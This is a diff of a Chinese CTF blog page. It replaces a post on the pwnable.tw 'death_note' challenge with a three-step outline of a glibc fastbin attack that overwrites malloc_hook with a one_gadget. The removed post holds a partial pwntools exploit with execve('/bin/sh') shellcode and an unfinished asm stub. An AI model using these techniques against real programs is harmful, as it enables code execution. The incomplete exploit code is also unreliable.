@@ -13,19 +13,19 @@
   
   
   
-  <title>pwnable.tw death_note | koocola&#39;s blog</title>
+  <title>fastbin attack的一种思路 | koocola&#39;s blog</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="做个记号">
+  <meta name="description" content="**1、** 覆盖堆快的fd指针值为(0x0-0x80)中适合构造的值 **2、** 这时候在main_arena中有该值存在，我们分配堆快到main_arena中再覆盖top_chunk的值为malloc_hook-0x10 **3、** 再分配堆快就会从malloc_hook-0x10开始分配，然后覆盖Malloc_hook为one_gadget再分配一个堆快就getshell了">
 <meta property="og:type" content="article">
-<meta property="og:title" content="pwnable.tw death_note">
-<meta property="og:url" content="http://yoursite.com/2018/09/30/death_note/index.html">
+<meta property="og:title" content="fastbin attack的一种思路">
+<meta property="og:url" content="http://yoursite.com/2018/10/02/fastbin/index.html">
 <meta property="og:site_name" content="koocola&#39;s blog">
-<meta property="og:description" content="做个记号">
+<meta property="og:description" content="**1、** 覆盖堆快的fd指针值为(0x0-0x80)中适合构造的值 **2、** 这时候在main_arena中有该值存在，我们分配堆快到main_arena中再覆盖top_chunk的值为malloc_hook-0x10 **3、** 再分配堆快就会从malloc_hook-0x10开始分配，然后覆盖Malloc_hook为one_gadget再分配一个堆快就getshell了">
 <meta property="og:locale" content="zh-CN">
-<meta property="og:updated_time" content="2018-09-30T14:06:47.766Z">
+<meta property="og:updated_time" content="2018-10-02T13:16:53.813Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="pwnable.tw death_note">
-<meta name="twitter:description" content="做个记号">
+<meta name="twitter:title" content="fastbin attack的一种思路">
+<meta name="twitter:description" content="**1、** 覆盖堆快的fd指针值为(0x0-0x80)中适合构造的值 **2、** 这时候在main_arena中有该值存在，我们分配堆快到main_arena中再覆盖top_chunk的值为malloc_hook-0x10 **3、** 再分配堆快就会从malloc_hook-0x10开始分配，然后覆盖Malloc_hook为one_gadget再分配一个堆快就getshell了">
   
   
     <link rel="icon" href="/css/images/favicon.ico">
@@ -66,7 +66,7 @@
     </nav>
 </header>
       <div id="main" class="wrapper">
-        <div id="primary" class="site-content"><div id="content" role="main"><article id="post-death_note" class="post-death_note post type-post status-publish format-standard hentry">
+        <div id="primary" class="site-content"><div id="content" role="main"><article id="post-fastbin" class="post-fastbin post type-post status-publish format-standard hentry">
     <!---->
 
       <header class="entry-header">
@@ -74,29 +74,34 @@
         
   
     <h1 class="entry-title article-title">
-      pwnable.tw death_note
+      fastbin attack的一种思路
     </h1>
   
 
         
         <div class="comments-link">
             
-            <a href="javascript:void(0);" data-url="http://yoursite.com/2018/09/30/death_note/" data-id="cjmrr096e0002a8tiomz6by06" class="leave-reply bdsharebuttonbox" data-cmd="more"></a>
+            <a href="javascript:void(0);" data-url="http://yoursite.com/2018/10/02/fastbin/" data-id="cjmrr09650000a8tipmcv6rtp" class="leave-reply bdsharebuttonbox" data-cmd="more"></a>
         </div><!-- .comments-link -->
       </header><!-- .entry-header -->
 
     <div class="entry-content">
       
-        <p>做个记号<br><a id="more"></a><br>    暂时能力还不够- -<br>    printable shellcode的编写真的太烧脑了，想了一天还是没写出来，看大师傅们的WP只能感叹思路的神奇，做个记录，以后再慢慢想<br>    ‘’’<br>    from pwn import <em><br>f=process(“./death_note”)<br>shellcode=”\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80\x00\x00\x00\x00”<br>def add(index,content):<br>    f.sendlineafter(“ :”,”1”)<br>    f.sendlineafter(“ :”,str(index))<br>    f.sendlineafter(“ :”,content)<br>def dele(index):<br>    f.sendlineafter(“ :”,”3”)<br>    f.sendlineafter(“ :”,str(index))<br>def show(index):<br>    f.sendlineafter(“ :”,”2”)<br>    f.sendlineafter(“ :”,str(index))<br>add(-15,”ppp”)<br>gdb.attach(f,’b </em>0x80484d0’)<br>add(-15,”\x01”)<br>shell=asm(“pop eax;<br>pop eax;<br>xor ax,0x2970;<br>xor ax,0x80;<br>xor ax,0x20;    #eax=addr<br>push eax;<br>pop ecx;<br>xor [ecx+ ?],”)<br>f.interactive()</p>
-<p>#0x8048A85<br>    ‘’’</p>
-
+        <a id="more"></a>
+<pre><code>**1、**
+覆盖堆快的fd指针值为(0x0-0x80)中适合构造的值
+**2、**
+这时候在main_arena中有该值存在，我们分配堆快到main_arena中再覆盖top_chunk的值为malloc_hook-0x10
+**3、**
+再分配堆快就会从malloc_hook-0x10开始分配，然后覆盖Malloc_hook为one_gadget再分配一个堆快就getshell了
+</code></pre>
       
     </div><!-- .entry-content -->
 
     <footer class="entry-meta">
-    <a href="/2018/09/30/death_note/">
-    <time datetime="2018-09-30T13:59:20.000Z" class="entry-date">
-        2018-09-30
+    <a href="/2018/10/02/fastbin/">
+    <time datetime="2018-10-02T13:16:20.000Z" class="entry-date">
+        2018-10-02
     </time>
 </a>
     
@@ -109,10 +114,8 @@
 <nav class="nav-single">
     <h3 class="assistive-text">文章导航</h3>
     
-        <span class="nav-previous"><a href="/2018/10/02/fastbin/" rel="prev"><span class="meta-nav">←</span> fastbin attack的一种思路</a></span>
     
-    
-        <span class="nav-next"><a href="/2018/09/24/pwn_build/" rel="next">pwn环境的简单部署 <span class="meta-nav">→</span></a></span>
+        <span class="nav-next"><a href="/2018/09/30/death_note/" rel="next">pwnable.tw death_note <span class="meta-nav">→</span></a></span>
     
 </nav><!-- .nav-single -->
 
